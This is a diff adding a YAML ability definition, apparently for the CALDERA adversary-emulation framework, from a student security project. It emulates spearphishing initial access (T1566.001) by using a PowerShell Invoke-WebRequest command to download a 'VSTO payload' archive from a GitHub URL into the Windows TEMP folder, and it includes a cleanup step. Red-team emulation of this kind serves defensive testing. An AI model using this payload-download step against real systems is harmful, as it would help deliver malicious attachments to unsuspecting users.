@@ -1,0 +1,33 @@
+- delete_payload: true
+  tactic: initial-access
+  privilege: ''
+  access: {}
+  additional_info:
+    cleanup: '[]'
+  repeatable: false
+  name: Downloading VSTO payload
+  technique_name: 'Phishing: Spearphishing Attachment'
+  requirements: []
+  singleton: false
+  description: Powershell code to download VSTO archive from a GitHub link
+  executors:
+  - parsers: []
+    platform: windows
+    additional_info: {}
+    timeout: 60
+    code: null
+    command: $url = 'https://github.com/Giorge9/Software_Security-Project_CALDERA/raw/main/Payload/Platinum_Rocket.7z';
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+      Invoke-WebRequest -Uri $url -OutFile $env:TEMP\Platinum_Rocket.7z
+    variations: []
+    name: psh
+    language: null
+    uploads: []
+    cleanup:
+    - Remove-Item $env:TEMP\Platinum_Rocket.7z -ErrorAction Ignore
+    payloads: []
+    build_target: null
+  technique_id: T1566.001
+  buckets: []
+  plugin: ''
+  id: d4121846-6d9b-4ba1-ad43-797966ed519b
